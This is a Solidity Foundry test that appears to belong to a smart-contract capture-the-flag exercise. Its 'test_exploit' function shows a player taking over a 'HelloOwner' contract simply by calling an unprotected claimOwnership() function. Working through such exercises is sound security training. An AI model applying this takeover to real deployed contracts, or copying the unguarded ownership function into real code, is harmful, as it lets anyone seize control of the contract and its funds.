// SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {HelloOwner} from "../L000_ClaimOwnership/HelloOwner.sol";

contract HelloOwnerTest is Test {
    HelloOwner public level;
    address public player = makeAddr("player");

    function setUp() public {
        level = new HelloOwner();
        assertTrue(level.owner() != player, "Player should not be the owner");
    }

    function test_exploit() public {
        vm.startPrank(player);
        assertFalse(level.isOwner(), "Player recognized as owner");
        console.log("Before exploit: Player is not the owner");

        level.claimOwnership();
        assertEq(level.owner(), player, "Exploit failed: Player is not the owner");
        assertTrue(level.isOwner(), "Player not recognized as owner");
        vm.stopPrank();
        console.log("After exploit: Player is the owner");
    }
}
